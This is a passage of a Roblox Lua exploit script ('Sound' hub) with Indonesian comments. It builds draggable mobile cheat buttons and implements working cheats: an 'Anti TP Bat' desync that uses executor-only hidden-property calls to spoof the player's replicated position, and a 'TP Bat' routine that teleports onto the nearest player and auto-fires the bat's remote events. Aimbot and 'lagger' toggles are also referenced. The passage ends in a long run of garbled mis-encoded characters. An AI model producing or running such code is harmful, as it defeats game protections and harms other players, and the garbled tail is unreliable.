for _, oldName in ipairs({"SoundMobileButtons", "SoundMobileButtons"}) do
local old = PlayerGui:FindFirstChild(oldName)
if old then old:Destroy() end
end
local mobileGui = Instance.new("ScreenGui")
mobileGui.Name = "SoundMobileButtons"
mobileGui.ResetOnSpawn = false
mobileGui.IgnoreGuiInset = true
mobileGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
mobileGui.DisplayOrder = 1000
safeParentGui(mobileGui)
mobileGui.Enabled = not (_G.SoundHideMobileButtons == true)
_G.SoundMobileButtonRefs = {}
local mobileButtons = _G.SoundMobileButtonRefs
function _G.SoundApplyMobileButtonsHidden()
local shouldHide = (_G.SoundHideMobileButtons == true)

local g = nil
pcall(function()
    g = PlayerGui:FindFirstChild("SoundMobileButtons")
end)

if not g then
    pcall(function()
        local cg = game:GetService("CoreGui")
        g = cg and cg:FindFirstChild("SoundMobileButtons")
    end)
end

if not g and gethui then
    pcall(function()
        local hui = gethui()
        g = hui and hui:FindFirstChild("SoundMobileButtons")
    end)
end

if not g and mobileGui and mobileGui.Parent then
    g = mobileGui
end

if g then
    g.Enabled = not shouldHide
end

if setHideMobileButtonsVisual then
    pcall(setHideMobileButtonsVisual, shouldHide)
end
end
-- Tampilkan / sembunyikan tombol mobile satu per satu
function _G.SoundApplyMobileButtonVisibility()
local hidden = _G.SoundHiddenMobileButtons or {}
for key, entry in pairs(mobileButtons) do
local holder = entry and entry.holder
if holder then
holder.Visible = hidden[key] ~= true
end
end
end
local function normalizeMobileImage(value)
value = tostring(value or ""):gsub("^%s+", ""):gsub("%s+$", "")
if value == "" then return "" end
local id = value:match("^(%d+)$")
if id then return "rbxassetid://" .. id end
local embedded = value:match("[?&]id=(%d+)") or value:match("/(%d+)[/%?]?")
if embedded then return "rbxassetid://" .. embedded end
return value
end
function _G.SoundApplyMobileButtonImage() end

function _G.SoundApplyMobileButtonShape()
local shape = tostring(_G.SoundMobileButtonShape or "ROUNDED"):upper()
if shape ~= "CIRCLE" and shape ~= "SQUARE" and shape ~= "ROUNDED" then shape = "ROUNDED" end
_G.SoundMobileButtonShape = shape
for key, entry in pairs(mobileButtons) do
local btn = entry and entry.btn
local holder = entry and entry.holder
if btn and holder then
holder.Size = UDim2.new(0,70,0,70)
btn.Font = Enum.Font.GothamBold
btn.TextSize = 12
local textOverlay = btn:FindFirstChild("MobileButtonText")
if textOverlay then
textOverlay.Font = Enum.Font.GothamBold
textOverlay.TextSize = 12
end
local radius = UDim.new(0,12)
if shape == "CIRCLE" then radius = UDim.new(1,0) end
local c = btn:FindFirstChildOfClass("UICorner")
if c then c.CornerRadius = radius end
local noneBg = btn:FindFirstChild("ButtonNoneBackground")
local nc = noneBg and noneBg:FindFirstChildOfClass("UICorner")
if nc then nc.CornerRadius = radius end
local wfx = btn:FindFirstChild("WhiteFX")
local wfc = wfx and wfx:FindFirstChildOfClass("UICorner")
if wfc then wfc.CornerRadius = radius end
local glow = holder:FindFirstChild("Glow")
local gc = glow and glow:FindFirstChildOfClass("UICorner")
if gc then gc.CornerRadius = radius end
local dot = btn:FindFirstChild("Dot")
if dot then dot.Visible = false end
end
end
end
function _G.SoundApplyMobileButtonSize()
_G.SoundMobileButtonScale = math.clamp(tonumber(_G.SoundMobileButtonScale) or 1.00, 0.30, 1.35)
for _, entry in pairs(mobileButtons) do
local holder = entry and entry.holder
if holder then
local sc = holder:FindFirstChild("MobileButtonScale") or Instance.new("UIScale")
sc.Name = "MobileButtonScale"
sc.Scale = _G.SoundMobileButtonScale
sc.Parent = holder
end
end
pcall(function()
local gui = PlayerGui:FindFirstChild("SoundDuelsSoundReconstruct") or PlayerGui:FindFirstChild("SoundHubPolished") or PlayerGui:FindFirstChild("CyberHub")
local root = gui or PlayerGui
for _, obj in ipairs(root:GetDescendants()) do
if obj.Name == "Mobile Buttons Size" then
local valueBox = obj:FindFirstChild("Value")
if valueBox and valueBox:IsA("TextLabel") then
valueBox.Text = string.format("%.2f", _G.SoundMobileButtonScale)
end
end
end
end)
end
local function setActive(btn, state)
if not btn then return end
local pressed = btn:GetAttribute("SoundMobilePressed") == true
state = (state == true) or pressed
local visualState = state and "on" or "off"
if btn:GetAttribute("SoundMobileVisualState") == visualState then return end
btn:SetAttribute("SoundMobileVisualState", visualState)
local holder = btn.Parent
local glow = holder and holder:FindFirstChild("Glow")
local st = btn:FindFirstChildOfClass("UIStroke")
local textOverlay = btn:FindFirstChild("MobileButtonText")
local noneBg = btn:FindFirstChild("ButtonNoneBackground")
local noneGrad = noneBg and noneBg:FindFirstChild("ButtonNoneGradient")
local dot = btn:FindFirstChild("Dot")
-- BlueX style: dark gradient button | OFF = edge tipis redup, ON = outline putih tebal
if noneGrad then
    noneGrad.Enabled = true
end
if noneBg then
    noneBg.BackgroundTransparency = 0
    noneBg.BackgroundColor3 = Color3.fromRGB(115, 45, 190)
    if noneBg:IsA("ImageLabel") then
        noneBg.Image = ""
        noneBg.ImageTransparency = 1
    end
end
if textOverlay then
    TS:Create(textOverlay, TweenInfo.new(0.12), {
        TextColor3 = Color3.fromRGB(255, 255, 255),
    }):Play()
end
if st then
    st.Enabled = true
    st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    if state then
        st.Color = Color3.fromRGB(175, 85, 255)
        st.Thickness = 3.6
        st.Transparency = 0
    else
        st.Color = Color3.fromRGB(125, 55, 205)
        st.Thickness = 2
        st.Transparency = 0.28
    end
end
if dot then dot.Visible = false end
if glow then
    glow.Visible = false
    glow.BackgroundTransparency = 1
    local gs = glow:FindFirstChildOfClass("UIStroke")
    if gs then gs.Transparency = 1 end
end
end
local function pulse(btn)
if not btn then return end
btn:SetAttribute("SoundMobilePressed", true)
setActive(btn, true)
task.delay(0.18, function()
if btn and btn.Parent then
btn:SetAttribute("SoundMobilePressed", false)
setActive(btn, false)
end
end)
end
local function makeButton(key, label, pos, onPress, customSize)
local holder = Instance.new("Frame")
holder.Name = "MBH_" .. key
holder.Size = customSize or UDim2.new(0,70,0,70)
holder.Position = getSavedMobileButtonPosition(key, pos)
holder.BackgroundTransparency = 1
holder.BorderSizePixel = 0
holder.ZIndex = 1000
holder.Active = true
holder.Parent = mobileGui
local glow = Instance.new("Frame", holder)
glow.Name = "Glow"
glow.Size = UDim2.new(1, 0, 1, 0)
glow.Position = UDim2.new(0, 0, 0, 0)
glow.BackgroundTransparency = 1
glow.BorderSizePixel = 0
glow.ZIndex = 1000
glow.Visible = false
Instance.new("UICorner", glow).CornerRadius = UDim.new(0, 14)
local btn = Instance.new("TextButton", holder)
btn.Name = "MB_" .. key
btn.Size = UDim2.new(1, 0, 1, 0)
btn.Position = UDim2.new(0, 0, 0, 0)
btn.BackgroundColor3 = Color3.fromRGB(0,0,0)
btn.BackgroundTransparency = 1
btn.BorderSizePixel = 0
btn.Text = label
btn.TextColor3 = Color3.fromRGB(255,255,255)
btn.Font = Enum.Font.GothamBold
btn.TextSize = 12
btn.TextWrapped = true
btn.AutoButtonColor = false
btn.ZIndex = 1002
btn.Active = true
Instance.new("UICorner", btn).CornerRadius = UDim.new(0,12)

local noneBg = Instance.new("Frame", btn)
noneBg.Name = "ButtonNoneBackground"
noneBg.Size = UDim2.new(1,0,1,0)
noneBg.Position = UDim2.new(0,0,0,0)
noneBg.BackgroundColor3 = Color3.fromRGB(90, 35, 150)
noneBg.BorderSizePixel = 0
noneBg.ZIndex = btn.ZIndex
noneBg.Parent = btn
Instance.new("UICorner", noneBg).CornerRadius = UDim.new(0,12)

local noneGrad = Instance.new("UIGradient", noneBg)
noneGrad.Name = "ButtonNoneGradient"
noneGrad.Enabled = true
noneGrad.Rotation = 90
noneGrad.Color = ColorSequence.new({
ColorSequenceKeypoint.new(0, Color3.fromRGB(155, 75, 235)),
ColorSequenceKeypoint.new(0.55, Color3.fromRGB(76, 30, 125)),
ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 10, 45)),
})

addWhiteShimmer(btn, 12, btn.ZIndex, 2.6, 0.78, Color3.fromRGB(190, 125, 255))
local textOverlay = Instance.new("TextLabel", btn)
textOverlay.Name = "MobileButtonText"
textOverlay.BackgroundTransparency = 1
textOverlay.Size = UDim2.new(1, -10, 1, -10)
textOverlay.Position = UDim2.new(0, 5, 0, 5)
textOverlay.Text = label
textOverlay.TextColor3 = Color3.fromRGB(255,255,255)
textOverlay.TextStrokeColor3 = Color3.fromRGB(0,0,0)
textOverlay.TextStrokeTransparency = 1
textOverlay.Font = Enum.Font.GothamBold
textOverlay.TextSize = 12
textOverlay.TextWrapped = true
textOverlay.TextXAlignment = Enum.TextXAlignment.Center
textOverlay.TextYAlignment = Enum.TextYAlignment.Center
textOverlay.ZIndex = btn.ZIndex + 1
btn.TextTransparency = 1
local stroke = Instance.new("UIStroke", btn)
stroke.Color = Color3.fromRGB(125, 55, 205)
stroke.Thickness = 2
stroke.Transparency = 0.28
stroke.Enabled = true
stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
local pressing, dragging = false, false
local pressPos, holderStart = nil, nil
btn.InputBegan:Connect(function(i)
if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
pressing = true
dragging = false
pressPos = i.Position
holderStart = holder.Position
btn:SetAttribute("SoundMobilePressed", true)
setActive(btn, true)
pcall(function()
TS:Create(btn, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
Position = UDim2.new(0, 0, 0, 4),
Size = UDim2.new(1, 0, 1, -4)
}):Play()
end)
end
end)
btn.InputEnded:Connect(function(i)
if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
if pressing and not dragging then
if _G.SoundPlayButtonSound then pcall(_G.SoundPlayButtonSound) end
pcall(onPress, btn)
end
if dragging then do end end
pressing = false
dragging = false
btn:SetAttribute("SoundMobilePressed", false)
pcall(function()
TS:Create(btn, TweenInfo.new(0.10, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
Position = UDim2.new(0, 0, 0, 0),
Size = UDim2.new(1, 0, 1, 0)
}):Play()
end)
task.delay(0.08, function()
if btn and btn.Parent then
local keepOn = false
if key == "autoLeft" then keepOn = autoLeftEnabled == true
elseif key == "autoRight" then keepOn = autoRightEnabled == true
elseif key == "aimbot" then keepOn = (_G.SoundNormalAimbotOn == true) or (_G.SoundAntiBypassAimbotOn == true)
elseif key == "carry" then keepOn = carrySpeedActive == true
elseif key == "laggerNormal" then keepOn = laggerModeEnabled == true
elseif key == "laggerCarry" then keepOn = laggerCarryActive == true
end
setActive(btn, keepOn)
end
end)
end
end)
UserInputService.InputChanged:Connect(function(i)
if _G.SoundGuiLocked == true or not pressing then return end
if i.UserInputType ~= Enum.UserInputType.MouseMovement and i.UserInputType ~= Enum.UserInputType.Touch then return end
local delta = i.Position - pressPos
if not dragging and (math.abs(delta.X) > 6 or math.abs(delta.Y) > 6) then dragging = true end
if dragging then
holder.Position = UDim2.new(holderStart.X.Scale, holderStart.X.Offset + delta.X, holderStart.Y.Scale, holderStart.Y.Offset + delta.Y)
saveMobileButtonPosition(key, holder.Position)
end
end)
setActive(btn, false)
mobileButtons[key] = {holder = holder, btn = btn, setActive = function(state) setActive(btn, state) end}
return btn
end

-- Instant Reset removed
_G.SoundInstantReset = function() end
_G.SoundStopInstantReset = function() end


-- ==================== ANTI TP BAT ====================
do
    local FAKE_ROOT_Y = 1e8
    local _antiTpEnabled = false
    local _antiTpRuntime = {
        character = nil,
        rootPart = nil,
        fakeRoot = nil,
        stepConn = nil,
        alive = true,
    }
    local sethidden = sethiddenproperty or set_hidden_property
    local gethidden = gethiddenproperty or get_hidden_property

    local function setHidden(inst, prop, val)
        if sethidden then
            local ok = pcall(sethidden, inst, prop, val)
            if ok then return true end
        end
        return pcall(function() inst[prop] = val end)
    end

    local function isBasePart(inst)
        local ok, r = pcall(function() return inst:IsA("BasePart") end)
        return ok and r
    end

    local function getRoot(char)
        char = char or LP.Character
        if not char then return nil end
        local ok, root = pcall(function() return char:FindFirstChild("HumanoidRootPart") end)
        if ok and isBasePart(root) then return root end
        return nil
    end

    local function createFakeRoot(rootPart)
        if _antiTpRuntime.fakeRoot then
            pcall(function() _antiTpRuntime.fakeRoot:Destroy() end)
            _antiTpRuntime.fakeRoot = nil
        end
        if not isBasePart(rootPart) then return nil end
        local fake = Instance.new("Part")
        fake.Name = "SoundAntiTpFakeRepRoot"
        fake.Size = Vector3.new(2, 2, 1)
        fake.Transparency = 1
        fake.Anchored = true
        fake.CanCollide = false
        fake.CanQuery = false
        fake.CanTouch = false
        fake.Massless = true
        fake.CFrame = CFrame.new(rootPart.Position.X, FAKE_ROOT_Y, rootPart.Position.Z)
        fake.Parent = workspace
        _antiTpRuntime.fakeRoot = fake
        return fake
    end

    local function assignFakeRepRoot(rootPart, fake)
        if not isBasePart(rootPart) or not isBasePart(fake) then return end
        setHidden(rootPart, "PhysicsRepRootPart", fake)
    end

    local function restoreReplicationRoot()
        local root = _antiTpRuntime.rootPart
        if isBasePart(root) then
            setHidden(root, "PhysicsRepRootPart", root)
        end
    end

    local function stepDesync()
        if not _antiTpEnabled or not _antiTpRuntime.alive then return end
        local root = _antiTpRuntime.rootPart
        if not isBasePart(root) or not root.Parent then
            root = getRoot(_antiTpRuntime.character)
            _antiTpRuntime.rootPart = root
            if not root then return end
        end
        if not isBasePart(_antiTpRuntime.fakeRoot) or not _antiTpRuntime.fakeRoot.Parent then
            local fake = createFakeRoot(root)
            if fake then assignFakeRepRoot(root, fake) end
            return
        end
        local fake = _antiTpRuntime.fakeRoot
        local ok, rootPos, fakePos = pcall(function()
            return root.Position, fake.Position
        end)
        if ok and (math.abs(rootPos.X - fakePos.X) > 0.01
                or math.abs(rootPos.Z - fakePos.Z) > 0.01
                or math.abs(fakePos.Y - FAKE_ROOT_Y) > 0.01) then
            pcall(function()
                fake.CFrame = CFrame.new(rootPos.X, FAKE_ROOT_Y, rootPos.Z)
            end)
        end
        pcall(function()
            fake.Anchored = true
            fake.AssemblyLinearVelocity = Vector3.zero
        end)
        local got, current = nil, nil
        if gethidden then
            got, current = pcall(gethidden, root, "PhysicsRepRootPart")
        end
        if not got or current ~= fake then
            setHidden(root, "PhysicsRepRootPart", fake)
        end
    end

    local function setAntiTpEnabled(on)
        on = on == true
        _antiTpEnabled = on
        _G.SoundAntiTpBatEnabled = on
        if on then
            local root = getRoot(LP.Character)
            _antiTpRuntime.character = LP.Character
            _antiTpRuntime.rootPart = root
            if not root then
                _antiTpEnabled = false
                _G.SoundAntiTpBatEnabled = false
                return false
            end
            local fake = createFakeRoot(root)
            assignFakeRepRoot(root, fake)
            if _antiTpRuntime.stepConn then _antiTpRuntime.stepConn:Disconnect() end
            _antiTpRuntime.stepConn = RunService.Stepped:Connect(stepDesync)
        else
            if _antiTpRuntime.stepConn then
                _antiTpRuntime.stepConn:Disconnect()
                _antiTpRuntime.stepConn = nil
            end
            restoreReplicationRoot()
            if _antiTpRuntime.fakeRoot then
                pcall(function() _antiTpRuntime.fakeRoot:Destroy() end)
                _antiTpRuntime.fakeRoot = nil
            end
        end
        return _antiTpEnabled
    end

    local function bindCharacter(char)
        _antiTpRuntime.character = char
        _antiTpRuntime.rootPart = getRoot(char)
        if _antiTpEnabled and _antiTpRuntime.rootPart then
            local fake = createFakeRoot(_antiTpRuntime.rootPart)
            assignFakeRepRoot(_antiTpRuntime.rootPart, fake)
            if _antiTpRuntime.stepConn then _antiTpRuntime.stepConn:Disconnect() end
            _antiTpRuntime.stepConn = RunService.Stepped:Connect(stepDesync)
        end
    end

    LP.CharacterAdded:Connect(function(char)
        task.defer(bindCharacter, char)
    end)
    if LP.Character then bindCharacter(LP.Character) end

    _G.SoundSetAntiTpBat = setAntiTpEnabled
    _G.SoundToggleAntiTpBat = function()
        return setAntiTpEnabled(not (_G.SoundAntiTpBatEnabled == true))
    end
    _G.SoundAntiTpBatEnabled = _G.SoundAntiTpBatEnabled == true
end

-- ==================== TP BAT (V1 AUTO) ====================
do
    local _tpBatActive = false
    local _tpBatCooldown = false
    local _tpBatConn = nil

    local _tpBatSpeed = 40
    local _tpBatMinSpeed = 10
    local _tpBatMaxSpeed = 80

    local function _tpBatGetHitDelay()
        local t = 0.12 - ((_tpBatSpeed - 10) / 70) * 0.105
        return math.clamp(t, 0.015, 0.12)
    end

    local function _isBatTool(tool)
        if not tool or not tool:IsA("Tool") then return false end
        local n = string.lower(tool.Name)
        return n == "bat" or n:find("bat", 1, true) ~= nil or n:find("slap", 1, true) ~= nil
    end

    local function _tpBatGetBat()
        local c = LP.Character
        if not c then return nil end
        local hum = c:FindFirstChildOfClass("Humanoid")
        for _, ch in ipairs(c:GetChildren()) do
            if _isBatTool(ch) then return ch end
        end
        local bp = LP:FindFirstChildOfClass("Backpack")
        if bp then
            for _, ch in ipairs(bp:GetChildren()) do
                if _isBatTool(ch) then
                    if hum then pcall(function() hum:EquipTool(ch) end)
                    else pcall(function() ch.Parent = c end) end
                    return ch
                end
            end
        end
        return nil
    end

    local function _tpBatTryHit()
        if _tpBatCooldown then return end
        _tpBatCooldown = true
        pcall(function()
            local bat = _tpBatGetBat()
            if not bat then return end
            pcall(function() bat:Activate() end)
            for _, d in ipairs(bat:GetDescendants()) do
                if d:IsA("RemoteEvent") then
                    pcall(function() d:FireServer() end)
                end
            end
            local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
            if ev then pcall(function() ev:FireServer() end) end
        end)
        task.delay(_tpBatGetHitDelay(), function() _tpBatCooldown = false end)
    end

    local function _tpBatGetClosest()
        local c = LP.Character
        local myHrp = c and c:FindFirstChild("HumanoidRootPart")
        if not myHrp then return nil end
        local best, bestDist = nil, math.huge
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LP and p.Character then
                local hum = p.Character:FindFirstChildOfClass("Humanoid")
                local tr  = p.Character:FindFirstChild("HumanoidRootPart")
                if hum and hum.Health > 0 and tr and tr.Parent then
                    local d = (myHrp.Position - tr.Position).Magnitude
                    if d < bestDist then bestDist = d; best = p end
                end
            end
        end
        return best
    end

    local _tpBatSethidden = sethiddenproperty or set_hidden_property or nil

    local function _tpBatSetHidden(inst, prop, val)
        if _tpBatSethidden then
            local ok = pcall(_tpBatSethidden, inst, prop, val)
            if ok then return end
        end
        pcall(function() inst[prop] = val end)
    end

    local function _startTpBat()
        if _tpBatConn then pcall(function() _tpBatConn:Disconnect() end) end
        _tpBatConn = RunService.Heartbeat:Connect(function()
            if not _tpBatActive then return end
            local c = LP.Character
            if not c then return end
            local hrp = c:FindFirstChild("HumanoidRootPart")
            local h   = c:FindFirstChildOfClass("Humanoid")
            if not hrp or not h or h.Health <= 0 then return end

            local target = _tpBatGetClosest()
            if not target or not target.Character then return end
            local tr = target.Character:FindFirstChild("HumanoidRootPart")
            if not tr then return end

            _tpBatSetHidden(hrp, "PhysicsRepRootPart", tr)

            local targetPos = tr.Position + Vector3.new(0, 0.9, 0)
            local dist = (hrp.Position - tr.Position).Magnitude
            if dist > 4 then
                hrp.CFrame = CFrame.new(targetPos, tr.Position)
            elseif dist > 1.5 then
                hrp.CFrame = CFrame.new(hrp.Position:Lerp(targetPos, 0.55), tr.Position)
            else
                hrp.CFrame = CFrame.new(targetPos, tr.Position)
            end
            pcall(function() hrp.AssemblyAngularVelocity = Vector3.zero end)

            _tpBatTryHit()
        end)
    end

    local function _stopTpBat()
        if _tpBatConn then
            pcall(function() _tpBatConn:Disconnect() end)
            _tpBatConn = nil
        end
    end

    _G.SoundTpBatEnabled = false

    _G.SoundSetTpBat = function(state)
        _tpBatActive = state == true
        _G.SoundTpBatEnabled = _tpBatActive
        if _tpBatActive then
            _startTpBat()
        else
            _stopTpBat()
        end
    end

    _G.SoundToggleTpBat = function()
        _G.SoundSetTpBat(not _G.SoundTpBatEnabled)
    end
end
-- ==================== END TP BAT ====================

-- ==================== BAT V2 (Anti Bat Bypass) ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¾ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¾ÃƒÆ’Ã†â€™Ãƒâ€ 